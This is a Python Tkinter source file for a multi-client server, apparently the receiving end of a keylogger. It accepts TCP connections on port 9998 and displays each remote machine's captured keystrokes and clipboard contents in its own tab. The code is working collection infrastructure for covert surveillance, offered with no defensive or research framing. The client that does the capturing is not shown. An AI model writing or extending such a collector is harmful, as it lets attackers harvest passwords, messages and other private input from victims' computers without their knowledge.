import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import socket
import threading
import queue
import datetime
import struct

# --- Configuration ---
HOST = '0.0.0.0'
PORT = 9998
# --- End Configuration ---

def receive_full_message(sock, buffer_size=4096):
    """
    Receives a message from the socket.
    Expects a 4-byte prefix indicating the message length, followed by the message payload.
    """
    try:
        length_prefix = b''
        while len(length_prefix) < 4:
            chunk = sock.recv(4 - len(length_prefix))
            if not chunk: return None
            length_prefix += chunk

        message_length = struct.unpack('!I', length_prefix)[0]

        message_body = b''
        while len(message_body) < message_length:
            chunk_size = min(message_length - len(message_body), buffer_size)
            chunk = sock.recv(chunk_size)
            if not chunk: return None
            message_body += chunk

        return message_body.decode('utf-8', errors='replace')
    except (socket.error, struct.error, ConnectionResetError, OSError):
        return None


class ServerApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Professional Key & Clipboard Server")
        self.master.geometry("1200x700")
        
        # Thread-safe queue for UI updates
        self.data_queue = queue.Queue()
        self.stop_event = threading.Event()
        self.client_tabs = {}  # Stores UI widgets associated with each client address

        # --- GUI Setup ---
        self.status_frame = tk.Frame(master)
        self.status_frame.pack(fill=tk.X, side=tk.TOP, padx=5, pady=5)
        
        self.lbl_listening = tk.Label(self.status_frame, text=f"Listening on: {HOST}:{PORT}", fg="darkgreen")
        self.lbl_listening.pack(side=tk.LEFT)

        # Notebook for managing multiple client tabs
        self.notebook = ttk.Notebook(master)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # --- Start Threads ---
        self.server_thread = threading.Thread(target=self.server_listen_thread, daemon=True)
        self.server_thread.start()
        
        # Start periodic queue processing
        self.master.after(100, self.process_queue)
        self.master.protocol("WM_DELETE_WINDOW", self.handle_window_close)

    def _apply_tags(self, widget):
        """Configures text coloring and styling tags for a given Text widget."""
        widget.tag_configure("timestamp", foreground="grey")
        widget.tag_configure("info", foreground="purple")
        widget.tag_configure("error", foreground="red", font=('TkDefaultFont', 10, 'bold'))
        widget.tag_configure("clipboard_header", foreground="darkblue", font=('TkDefaultFont', 10, 'bold'))
        widget.tag_configure("key_enter", foreground="darkorange")
        widget.tag_configure("key_special", foreground="darkorange")

    def _insert_tagged_text(self, widget, text, tag_name=None):
        """Safely inserts tagged text into a disabled Text widget and scrolls to the bottom."""
        widget.config(state='normal')
        if tag_name:
            widget.insert(tk.END, text, (tag_name,))
        else:
            widget.insert(tk.END, text)
        widget.config(state='disabled')
        widget.see(tk.END)

    def get_or_create_client_tab(self, address):
        """Retrieves an existing UI tab for a client, or creates a new one if it doesn't exist."""
        if address in self.client_tabs:
            return self.client_tabs[address]

        tab_frame = tk.Frame(self.notebook)
        self.notebook.add(tab_frame, text=address)
        
        # Client status label
        status_lbl = tk.Label(tab_frame, text="Status: Connected", fg="blue", anchor="w")
        status_lbl.pack(fill=tk.X)

        content_frame = tk.Frame(tab_frame)
        content_frame.pack(fill=tk.BOTH, expand=True)

        # Clipboard History Widget
        clip_frame = tk.LabelFrame(content_frame, text="Clipboard History")
        clip_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=2)
        txt_clip = scrolledtext.ScrolledText(clip_frame, wrap=tk.WORD, state='disabled')
        txt_clip.pack(fill=tk.BOTH, expand=True)
        self._apply_tags(txt_clip)

        # Keystrokes Log Widget
        keys_frame = tk.LabelFrame(content_frame, text="Keystrokes Log")
        keys_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=2)
        txt_keys = scrolledtext.ScrolledText(keys_frame, wrap=tk.WORD, state='disabled')
        txt_keys.pack(fill=tk.BOTH, expand=True)
        self._apply_tags(txt_keys)

        self.client_tabs[address] = {
            "tab_frame": tab_frame,
            "status": status_lbl,
            "clip": txt_clip,
            "keys": txt_keys
        }
        return self.client_tabs[address]

    def process_queue(self):
        """Processes messages from the background threads to update the UI."""
        try:
            while True:
                msg = self.data_queue.get_nowait()
                msg_type = msg.get("type")
                address = msg.get("address", "Unknown")
                payload = msg.get("payload", "")
                timestamp = datetime.datetime.now().strftime("%H:%M:%S")

                if msg_type == "ERROR_MAIN":
                    messagebox.showerror("Server Error", payload)
                    continue

                # Fetch the UI components specific to the sending client
                widgets = self.get_or_create_client_tab(address)

                if msg_type == "STATUS":
                    widgets["status"].config(text=f"Status: {payload}", fg=msg.get("color", "black"))
                
                elif msg_type == "DATA":
                    ts_prefix = f"[{timestamp}] "
                    
                    if payload.startswith("CLIPBOARD:"):
                        content = payload[len("CLIPBOARD:"):].strip()
                        self._insert_tagged_text(widgets["clip"], "\n" + "-"*40 + "\n", "timestamp")
                        self._insert_tagged_text(widgets["clip"], ts_prefix, "timestamp")
                        self._insert_tagged_text(widgets["clip"], "Clipboard Paste:\n", "clipboard_header")
                        self._insert_tagged_text(widgets["clip"], content + "\n")
                    
                    elif payload.startswith("KEY:"):
                        key_info = payload[len("KEY:"):].strip()
                        if key_info.startswith("<") and key_info.endswith(">"):
                            if key_info == "<enter>":
                                self._insert_tagged_text(widgets["keys"], ts_prefix, "timestamp")
                                self._insert_tagged_text(widgets["keys"], key_info + "\n", "key_enter")
                            else:
                                self._insert_tagged_text(widgets["keys"], key_info + " ", "key_special")
                        else:
                            self._insert_tagged_text(widgets["keys"], key_info)
                            
                    elif payload.startswith("INFO:"):
                        info = payload[len("INFO:"):].strip()
                        self._insert_tagged_text(widgets["keys"], f"\n{ts_prefix}[INFO] {info}\n", "info")
                        
        except queue.Empty:
            pass
        finally:
            # Re-schedule the queue check
            self.master.after(100, self.process_queue)

    def handle_client(self, client_socket, address):
        """Dedicated thread function to handle incoming data from a single client."""
        addr_str = f"{address[0]}:{address[1]}"
        self.data_queue.put({"type": "STATUS", "payload": "Connected", "address": addr_str, "color": "blue"})
        self.data_queue.put({"type": "DATA", "payload": "INFO: Client connected.", "address": addr_str})

        try:
            while not self.stop_event.is_set():
                full_message = receive_full_message(client_socket)
                if full_message is None:
                    break  # Connection lost or closed
                
                self.data_queue.put({"type": "DATA", "payload": full_message, "address": addr_str})
        except Exception as e:
             self.data_queue.put({"type": "DATA", "payload": f"INFO: Error - {e}", "address": addr_str})
        finally:
            client_socket.close()
            self.data_queue.put({"type": "STATUS", "payload": "Disconnected", "address": addr_str, "color": "orange"})
            self.data_queue.put({"type": "DATA", "payload": "INFO: Client disconnected.", "address": addr_str})

    def server_listen_thread(self):
        """Main server thread that continually accepts new incoming client connections."""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            server_socket.bind((HOST, PORT))
            server_socket.listen(100)  # Allows multiple concurrent connections
        except socket.error as e:
            self.data_queue.put({"type": "ERROR_MAIN", "payload": f"Failed to bind: {e}"})
            return

        server_socket.settimeout(1.0)  # Timeout allows the loop to periodically check self.stop_event
        while not self.stop_event.is_set():
            try:
                client_socket, client_address = server_socket.accept()
                # Spawn a new thread for each connected client
                threading.Thread(target=self.handle_client, args=(client_socket, client_address), daemon=True).start()
            except socket.timeout:
                continue
            except Exception:
                break
                
        server_socket.close()

    def handle_window_close(self):
        """Prompts the user for confirmation before stopping the server and exiting."""
        if messagebox.askokcancel("Quit", "Stop and shut down the server?"):
            self.stop_event.set()
            self.master.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = ServerApp(root)
    root.mainloop()